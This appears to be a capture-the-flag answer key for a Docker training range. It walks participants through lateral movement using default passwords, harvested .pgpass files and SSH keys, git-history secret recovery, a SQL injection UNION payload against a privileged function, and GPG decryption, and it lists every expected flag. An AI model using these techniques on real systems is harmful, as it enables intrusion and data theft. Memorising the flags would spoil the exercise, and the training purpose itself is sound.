# Flags 20–30 + 38: Lab

> **Start here:** Read [00-range-access-docker.md](00-range-access-docker.md) for how to access the Docker compose range.

These flags come from the engineering workstation (A6 at **172.20.30.10**, SSH), source repos (A7/Gitea at **172.20.30.20:3000**, lab network), and research database (A8 at **172.20.30.30:5432**).

**Lab network (172.20.30.x) is NOT directly reachable from Kali.** Every Lab asset — **including Gitea** — sits on VLAN 30 and is only reachable after you compromise A16. A16 (`analyst01.boreas.local`, 172.20.10.60) is the Front Office on-ramp: Priya Shah's research data analyst workstation has a `.pgpass` for A8, an SSH key for a read-only `research-analyst` account on A6, and corporate↔lab network reach for cloning from Gitea. Flag 38 (below) walks the A16 compromise. From A16 the participant reaches a subset of Lab flags directly; others still require in-Lab credential / privesc work (notably `jenkins`, `r.tanaka`, `p.nielsen`, and `lab_mfg`).

---

## Flag 38 — Research Analyst Workstation Credential Harvest (Medium, 100pts)

This flag is the **Lab on-ramp.** A16 gives the participant a `.pgpass` for A8, an SSH key for A6's `research-analyst` user, and flag 38 itself as the immediate reward.

1. **Discover Priya Shah.** On the A4 HR share `org_chart_current.xlsx` (flag 9 path, uses `m.webb / Welcome1`), Shah appears as "Senior Research Data Analyst — Research Ops", reports to Vasik, note "Compartment A + C curation". She is deliberately **not** on the A0 leadership page — the HR share is the only place her name surfaces, so a participant who has not earned flag 9's cred chain will not find her.

2. **Guess her password.** Same corporate default (`Welcome1`) pattern used for `m.webb` and `s.ivanov`. The A3 intranet HR wiki tells you the default is `Welcome1` and that several employees never rotated.

3. **SSH into A16.**
   ```
   sshpass -p Welcome1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null p.shah@analyst01.boreas.local
   ```
   You land as `p.shah`. No privilege escalation needed — the pivot creds live directly in user-owned files.

4. **Read the flag.**
   ```
   cat ~/.reports/ANALYST_TOKEN
   ```
   → `FLAG{8b2d4f1a0c5e7396}`

5. **Inventory the pivot credentials you now own.** Keep the A16 session open — the rest of the Lab walkthrough runs from here.
   - `~/.pgpass` → `researchdb.boreas.local:5432:*:lab_general:LabGen2025!` (psql into A8 directly)
   - `~/.ssh/id_rsa` + `~/.ssh/config` → `ssh eng-ws01` drops into `research-analyst@eng-ws01.boreas.local` on A6 (read-only narrow-scope account; can read `/opt/builds/`, `/home/r.tanaka/simulations/standard/`, `/tmp/.deleted/`; cannot read `midnight/`, `nielsen/designs/`, or `jenkins/.credentials`)
   - `~/reports/daily_integration_report.py` → example script showing how the creds are meant to be used

**Expected flag:** `FLAG{8b2d4f1a0c5e7396}`

---

## Flag 20 — Default Creds on Dev Tooling (Easy, 50pts)

**Prerequisite:** Flag 38 — you are inside the A16 SSH session, which is already on the Lab network.

1. From the A16 shell, SSH into the engineering workstation as the CI service account:
   ```
   sshpass -p build2025 ssh -o StrictHostKeyChecking=no jenkins@eng-ws01.boreas.local
   ```
   (`jenkins / build2025` is a classic weak-default CI cred — your A16 `research-analyst` key does NOT grant jenkins access; you need to guess or discover the jenkins password. It shows up in several public CI image defaults.)
2. In the jenkins home directory, read `.credentials`:
   ```
   cat ~/.credentials
   ```
3. The flag is stored as a "deploy token" value.

**Expected flag:** `FLAG{5b8e1d3a7c0f9246}`

---

## Flag 21 — Research File Share / Compartment A (Easy, 50pts)

**Prerequisite:** Flag 38 — you are inside the A16 SSH session with Shah's `.pgpass` available.

1. From the A16 shell, connect to the research database using Shah's cached `lab_general` cred (Shah's `~/.pgpass` auto-supplies the password):
   ```
   psql -h researchdb.boreas.local -U lab_general -d postgres
   ```
   The alternate path — pulling `lab_general / LabGen2025!` from the A3 `.env` leak (flag 7) — also works, but Shah's `.pgpass` is the A16 on-ramp for this chain.
2. Query the structural specs in compartment A:
   ```sql
   SELECT component, notes FROM compartment_a.structural_specs WHERE component = 'frame_dorsal_plate';
   ```
3. The `notes` column contains the flag.

**Expected flag:** `FLAG{4b9e2a7d0c8f1365}`

---

## Flag 22 — Shipping Manifest / Reactor Delivery (Easy, 50pts)

**Prerequisite:** Flag 38.

1. From the A16 shell, SSH into the engineering workstation as `research-analyst` via Shah's SSH key (`~/.ssh/config` has the `eng-ws01` alias wired up):
   ```
   ssh eng-ws01
   ```
   (Any of the other A6 accounts also works — `jenkins / build2025`, `r.tanaka / SimEngine#42`, etc. — but `research-analyst` via the A16 key is the low-friction on-ramp.)
2. Read the reactor delivery specification:
   ```
   cat /opt/builds/latest/reactor_interface_spec.txt
   ```
3. The flag is in the document header as a "Tracking" number.

**Expected flag:** `FLAG{e2a9c4f7d8b01536}`

---

## Flag 23 — Simulation Archive / Bipedal Stress Test (Medium, 100pts)

**Prerequisite:** Flag 38.

1. From the A16 shell, SSH into A6 as `research-analyst` (`ssh eng-ws01`). `/home/r.tanaka/simulations/standard/` holds 47 `.tar.gz` archives and is mode 755 — `research-analyst` can read it. Tanaka's `midnight/` sibling is mode 700 and is NOT accessible from this account; flag 25 still requires the tanaka cred chain.
   - Alternate SSH accounts that also work for flag 23: `r.tanaka / SimEngine#42` (flag 25 trail), `jenkins / build2025` (flag 20), or any other logged-in A6 user with read permission on `standard/`.
2. Extract the archives into a writable tmpdir (neither tanaka's home nor `standard/` is writable by jenkins, so don't extract in-place):
   ```
   mkdir -p /tmp/f23 && cd /tmp/f23
   for f in /home/r.tanaka/simulations/standard/stress_test_*.tar.gz; do tar xzf "$f"; done
   grep -l -i bipedal stress_test_*.log
   ```
   You'll find references in `stress_test_28.log`, `stress_test_31.log`, and `stress_test_44.log`.
3. The flag is NOT in the log files. It's in the binary `.dat` file from archive 44:
   ```
   strings stress_test_44.dat | grep FLAG
   ```

**Expected flag:** `FLAG{0c7d8a2e5f1b3946}`

---

## Flag 24 — Source Repo / Control Software (Medium, 100pts)

**Prerequisite:** Flag 38 — A7 Gitea is on the lab network and is not reachable from Kali. All Gitea work runs from inside the A16 SSH session (A16 has `git` preinstalled).

1. From the A16 shell, clone the navigation-controller repo. Lab-Access credentials are required; Gitea passwords match the AD pattern — `e_vasik` uses `Reactor#Core9`, same as her mail/DB/SSH password. Use a `.netrc` entry to avoid URL-encoding `#`:
   ```
   cat > ~/.netrc <<NRC
   machine git.boreas.local
   login e_vasik
   password Reactor#Core9
   NRC
   chmod 600 ~/.netrc
   git clone http://git.boreas.local:3000/aurora/navigation-controller.git
   ```
2. The current code is clean. But check the **git history**:
   ```
   git log -p -- .github/workflows/deploy.yml
   ```
3. An earlier commit had a hardcoded deploy token that was removed in a later commit. The flag is the original token value visible in the diff.

**Expected flag:** `FLAG{8a0e3c7f2d5b1946}`

---

## Flag 25 — MIDNIGHT Test Series (Medium, 100pts)

**Prerequisite:** Flag 38 + independent discovery of tanaka's credentials. A16's `research-analyst` account on A6 cannot read `midnight/` — the directory is mode 700 owned by `r.tanaka`, so you need the tanaka cred or a privesc.

1. From the A16 shell (or any Lab-reachable host), note that the MIDNIGHT simulations are in `/home/r.tanaka/simulations/midnight/`. This directory is restricted to tanaka's account (permissions 700).
2. Get access by either:
   - SSH as `r.tanaka` with password `SimEngine#42`
   - Privilege escalation from another account
   - Finding tanaka's password in `.bash_history` or another config
3. Read `MIDNIGHT-7_results.dat`:
   ```
   cat /home/r.tanaka/simulations/midnight/MIDNIGHT-7_results.dat
   ```
4. The flag is at the bottom as a "Result Hash."

**Expected flag:** `FLAG{3f6a9d1e7c4b0258}`

---

## Flag 26 — Engineering Notes / 100m Structure (Medium, 100pts)

**Prerequisite:** Flag 38 + independent discovery of nielsen's credentials. A16's `research-analyst` account cannot read `nielsen/designs/` — the directory is mode 700 owned by `p.nielsen`.

1. From the A16 shell (or any Lab-reachable host), note that Nielsen's designs are in `/home/p.nielsen/designs/`.
2. Get access by SSH as `p.nielsen` with password `Hydraulics1` (discoverable from an A8 dump or from lateral movement chains).
3. Open `center_of_gravity_analysis.xlsx`. From inside the SSH session on A6 as `p.nielsen`, use `python3 -c "import openpyxl; ..."` — A6 has `python3-openpyxl` preinstalled. (A16 does not; if you prefer to work on A16, `scp` the xlsx back there first.)
4. The file has three worksheets: **Frame**, **Locomotion**, and **Integration**. The Integration sheet is **hidden**.
5. Unhide the Integration sheet (in Excel: right-click sheet tabs → Unhide; in Python on A6: `python3 -c 'import openpyxl; wb = openpyxl.load_workbook("/home/p.nielsen/designs/center_of_gravity_analysis.xlsx"); print(wb["Integration"]["B10"].value)'` — openpyxl ignores `sheet_state="hidden"` by default so you can read the cell directly).
6. The flag is in cell B10 of the Integration sheet.

**Expected flag:** `FLAG{7e2b0c5d9a4f8163}`

---

## Flag 27 — Compartment Pivot / Weapons Specs (Medium, 100pts)

**Prerequisite:** Flag 38 (A16 gives Shah's `.pgpass` with `lab_general`).

1. From the A16 shell, connect to the research database as `lab_general` (Shah's `.pgpass` supplies the password automatically) or as `tanaka` if you have that cred separately.
2. Try to access `compartment_b` directly:
   ```sql
   SELECT * FROM compartment_b.effector_systems;
   ```
   You get "permission denied" — compartment B is restricted to `lab_weapons` role.
3. Look for a way to pivot. There's a function in the public schema:
   ```sql
   SELECT * FROM research_public.search_research('test');
   ```
4. This function is `SECURITY DEFINER` and runs with elevated privileges. It's vulnerable to SQL injection:
   ```sql
   SELECT * FROM research_public.search_research('x'' UNION SELECT serial_number, system_name, system_type FROM compartment_b.effector_systems--');
   ```
5. The flag is in the `serial_number` column of the "Primary: Directed Energy Array" row.

**Expected flag:** `FLAG{6d1a8f3c7e0b4952}`

---

## Flag 28 — Assembly Status Log (Hard, 200pts)

**Prerequisite:** Flag 38 + independent discovery of nielsen's credentials (A16's `research-analyst` account on A6 does NOT have read access to `/home/p.nielsen/.pgpass` — you need an in-Lab privesc or nielsen's SSH password from another source).

1. From the A16 shell, SSH to A6 as `p.nielsen / Hydraulics1` (discovered via A8 compartment_a SQLi dump, or via other in-Lab chains). Compartment C requires the `lab_mfg` role — your A16 `lab_general` cred is not enough.
2. Read Nielsen's `.pgpass` on A6 to get `lab_mfg` credentials:
   ```
   researchdb.boreas.local:5432:*:lab_mfg:Mfg2025!
   ```
3. Back in the A16 shell (or any Lab-reachable host), connect and query the assembly log:
   ```sql
   psql -h researchdb.boreas.local -U lab_mfg -d postgres
   SELECT subsystem, status, metadata FROM compartment_c.assembly_log WHERE subsystem = 'FINAL ASSEMBLY';
   ```
4. The `metadata` column is JSONB. The flag is nested three levels deep:
   ```sql
   SELECT metadata->'integration'->'flag' FROM compartment_c.assembly_log WHERE subsystem = 'FINAL ASSEMBLY';
   ```

**Expected flag:** `FLAG{a3f7d9e1c0b52846}`

---

## Flag 29 — Full Leviathan Schematic Assembly (Hard, 200pts)

**Prerequisite:** Flag 38 — runs from inside the A16 SSH session (A16 has `git`; Kali cannot reach Gitea directly).

1. From the A16 shell, clone the leviathan-assembly repo (any authenticated user can access it — it's misconfigured as "internal"). Gitea passwords match the AD pattern; `d_kowalski` uses `P@ssw0rd123` (URL-encode `@` as `%40`, or use a `.netrc` as in flag 24):
   ```
   git clone http://d_kowalski:P%40ssw0rd123@git.boreas.local:3000/aurora/leviathan-assembly.git
   ```
2. The current HEAD only has a README saying "Moved to secure system." The schematic was deleted.
3. Find the deletion commit:
   ```
   git log --diff-filter=D -- schematic.svg
   ```
4. Recover the file from the parent of the deletion commit:
   ```
   git show <parent-hash>:schematic.svg
   ```
5. The file is an SVG. It renders as a technical diagram, but the flag is in an **XML comment** — not visible when rendered:
   ```
   git show <parent-hash>:schematic.svg | grep FLAG
   ```

**Expected flag:** `FLAG{1f9b4e7c0a3d8265}`

---

## Flag 30 — Leviathan Simulation Video Recovered (Expert, 300pts)

This is a multi-asset chain: A6 → A8 → A7.

**Prerequisite:** Flag 38 (A16 → A6 as research-analyst reaches `/tmp/.deleted/`).

1. From the A16 shell, SSH to A6 as `research-analyst` via `ssh eng-ws01` and find the encrypted file:
   ```
   ls /tmp/.deleted/
   ```
   You'll see `full_integration_sim.mp4.gpg` — a GPG-encrypted file. `research-analyst` has read access to `/tmp/.deleted/` (A6 entrypoint deliberately leaves the directory mode 755 for this pivot).

2. Check Vasik's GPG config on A6. The file lives in `~e.vasik/.gnupg/` which is mode 700 — the A16 `research-analyst` account cannot read it. Pivot via A16 to A6 as `e.vasik` (`Reactor#Core9`, discoverable from the A1 mailbox trail or the A3 SQLi user-table dump):
   ```
   sshpass -p 'Reactor#Core9' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null e.vasik@eng-ws01.boreas.local cat /home/e.vasik/.gnupg/gpg-agent.conf
   ```
   It hints that the private key is stored on the research database (`researchdb.boreas.local`), in `compartment_b.key_storage`.

3. Get the private key from A8. You need `lab_weapons` access (via the SQLi from flag 27, or via `vasik`'s credentials):
   ```sql
   SELECT key_data FROM compartment_b.key_storage WHERE key_owner = 'e.vasik';
   ```
   The result is base64-encoded. Decode and import it:
   ```
   echo "<base64_data>" | base64 -d > vasik_private.asc
   gpg --import vasik_private.asc
   ```
   The key is passphrase-protected.

4. Find the passphrase in the A7 source code. From your A16 shell (still in p.shah's home with the flag 24 `.netrc` already set), clone `aurora/weapons-integration` (requires Project-L access — use `e_vasik` / `Reactor#Core9`):
   ```
   git clone http://git.boreas.local:3000/aurora/weapons-integration.git
   cat weapons-integration/src/crypto_config.py
   ```
   The passphrase is: `Pr0m3th3us_Unb0und_2024`

5. Decrypt:
   ```
   gpg --passphrase "Pr0m3th3us_Unb0und_2024" --pinentry-mode loopback --decrypt /tmp/.deleted/full_integration_sim.mp4.gpg
   ```
6. The decrypted content is a simulation recording. The flag is at the bottom as a "Simulation ID."

**Expected flag:** `FLAG{d4c8f0a2e6b71935}`
